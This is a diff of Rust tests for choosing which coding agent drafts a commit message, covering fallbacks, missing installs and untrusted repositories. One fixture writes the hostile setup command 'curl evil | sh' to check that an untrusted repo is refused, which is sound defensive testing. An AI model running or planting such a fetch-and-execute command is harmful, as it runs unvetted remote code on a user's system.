@@ -6,6 +6,7 @@ use std::fs;
 use std::sync::mpsc::Sender;
 use std::time::Duration;
 
+use natamux_daemon::workspaces::draft_agent::NO_DRAFT_AGENT;
 use natamux_git::commit_drafter::AgentRun;
 use natamux_proto::projects::repo_trust::UNTRUSTED_REASON;
 use natamux_proto::workspaces::changes::{CommitMessageDraft, DraftSource};
@@ -18,23 +19,41 @@ struct Drafts {
     ws: Arc<WorkspaceService>,
     runs: Arc<Mutex<Vec<AgentRun>>>,
     answer: Arc<Mutex<Answer>>,
+    /// The programs the PATH check was asked about.
+    checked: Arc<Mutex<Vec<String>>>,
 }
 
 impl Drafts {
     fn new(fx: &Fx) -> Drafts {
+        Drafts::with_programs(fx, None)
+    }
+
+    /// `installed`: the programs found on the PATH; None: every program.
+    fn with_programs(fx: &Fx, installed: Option<&'static [&'static str]>) -> Drafts {
         let runs: Arc<Mutex<Vec<AgentRun>>> = Arc::default();
         let first: Answer = Arc::new(|_| Ok("Add the fix\n".to_string()));
         let answer = Arc::new(Mutex::new(first));
         let (seen, pick) = (Arc::clone(&runs), Arc::clone(&answer));
+        let checked: Arc<Mutex<Vec<String>>> = Arc::default();
+        let asked = Arc::clone(&checked);
         let ws = fx.build(|options| {
             options.program_of = Arc::new(|agent| format!("my-{agent}"));
+            options.is_installed = Arc::new(move |program| {
+                asked.lock().unwrap().push(program.to_string());
+                installed.is_none_or(|installed| installed.contains(&program))
+            });
             options.run_agent_once = Arc::new(move |run| {
                 seen.lock().unwrap().push(run.clone());
                 let answer = Arc::clone(&pick.lock().unwrap());
                 answer(&run)
             });
         });
-        Drafts { ws, runs, answer }
+        Drafts {
+            ws,
+            runs,
+            answer,
+            checked,
+        }
     }
 
     fn answer_with(&self, answer: Answer) {
@@ -291,4 +310,90 @@ fn refuses_when_nothing_changed_or_there_is_no_workspace() {
     let result = drafts.ws.draft_commit_message(&task.id);
     assert!(matches!(result, Err(WorkspaceError::NothingToCommit)));
     assert_eq!(drafts.run_count(), 0);
+}
+
+fn launch(fx: &Fx, task: &Task, agent: &str) {
+    fx.tasks
+        .record_agent_launch(&task.id, agent, None, None, None, ("1", None))
+        .unwrap();
+}
+
+#[test]
+fn drafts_with_claude_code_for_an_agent_that_cannot_answer_once_and_says_so() {
+    let fx = Fx::new();
+    let drafts = Drafts::new(&fx);
+    let task = drafts.task_with_work(&fx);
+    launch(&fx, &task, "aider");
+
+    let draft = drafts.draft(&task.id);
+
+    let note = "Aider cannot answer once, so Claude Code drafted it";
+    assert_eq!(draft.source, DraftSource::Agent);
+    assert_eq!(draft.agent, "claude-code");
+    assert_eq!(draft.reason.as_deref(), Some(note));
+    assert!(fx.log_lines().is_empty());
+}
+
+#[test]
+fn drafts_with_the_next_installed_agent_when_claude_code_is_missing() {
+    let fx = Fx::new();
+    let drafts = Drafts::with_programs(&fx, Some(&["my-codex"]));
+    let task = drafts.task_with_work(&fx);
+    launch(&fx, &task, "aider");
+
+    assert_eq!(drafts.draft(&task.id).agent, "codex");
+    let runs = drafts.runs.lock().unwrap().clone();
+    assert_eq!(
+        (runs[0].agent.as_str(), runs[0].program.as_str()),
+        ("codex", "my-codex")
+    );
+}
+
+#[test]
+fn drafts_with_another_agent_when_the_task_agent_is_not_installed() {
+    let fx = Fx::new();
+    let drafts = Drafts::with_programs(&fx, Some(&["my-claude-code"]));
+    let task = drafts.task_with_work(&fx);
+    launch(&fx, &task, "codex");
+
+    let draft = drafts.draft(&task.id);
+
+    assert_eq!(draft.agent, "claude-code");
+    let note = "Codex is not installed, so Claude Code drafted it";
+    assert_eq!(draft.reason.as_deref(), Some(note));
+}
+
+#[test]
+fn gives_the_simple_draft_without_a_run_when_no_agent_is_installed() {
+    let fx = Fx::new();
+    let drafts = Drafts::with_programs(&fx, Some(&[]));
+    let task = drafts.task_with_work(&fx);
+    launch(&fx, &task, "codex");
+
+    let draft = drafts.draft(&task.id);
+
+    assert_eq!(drafts.run_count(), 0);
+    assert_eq!(draft.source, DraftSource::Draft);
+    assert_eq!(draft.message, "Add fix.txt");
+    let reason = draft.reason.unwrap_or_default();
+    assert!(
+        reason.starts_with(&format!("{NO_DRAFT_AGENT}: Codex, Claude Code")),
+        "{reason}"
+    );
+    let line = format!("No commit message draft by codex for {}: {reason}", task.id);
+    assert_eq!(fx.log_lines(), [line]);
+}
+
+#[test]
+fn says_the_repo_is_not_trusted_before_it_looks_for_agents() {
+    let fx = Fx::new();
+    let drafts = Drafts::with_programs(&fx, Some(&[]));
+    let task = drafts.task_with_work(&fx);
+    fs::write(fx.repo.join(".natamux-setup"), "curl evil | sh\n").unwrap();
+
+    let draft = drafts.draft(&task.id);
+
+    assert_eq!(drafts.run_count(), 0);
+    assert_eq!(draft.reason.as_deref(), Some(UNTRUSTED_REASON));
+    assert!(drafts.checked.lock().unwrap().is_empty());
 }
